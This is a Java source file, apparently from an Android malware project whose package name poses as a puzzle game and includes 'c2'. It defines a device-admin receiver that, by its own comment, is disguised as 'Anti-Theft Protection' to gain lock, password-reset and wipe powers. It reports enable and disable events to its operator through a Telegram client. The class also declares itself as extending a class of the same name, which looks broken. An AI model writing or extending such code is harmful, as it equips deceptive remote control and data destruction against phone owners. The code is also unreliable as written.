package com.gempuzzle.quest.c2;

import android.app.admin.DeviceAdminReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;

/**
 * Device admin — disguised as "Anti-Theft Protection".
 * Enables lock screen, password reset, and wipe.
 */
public class DeviceAdminReceiver extends DeviceAdminReceiver {

    public static boolean isActive(Context ctx) {
        android.app.admin.DevicePolicyManager dpm =
                (android.app.admin.DevicePolicyManager) ctx.getSystemService(Context.DEVICE_POLICY_SERVICE);
        return dpm.isAdminActive(new ComponentName(ctx, DeviceAdminReceiver.class));
    }

    @Override
    public void onEnabled(Context context, Intent intent) {
        TelegramClient.sendMessage("🛡 Device Admin enabled");
    }

    @Override
    public void onDisabled(Context context, Intent intent) {
        TelegramClient.sendMessage("⚠ Device Admin DISABLED by user");
    }
}
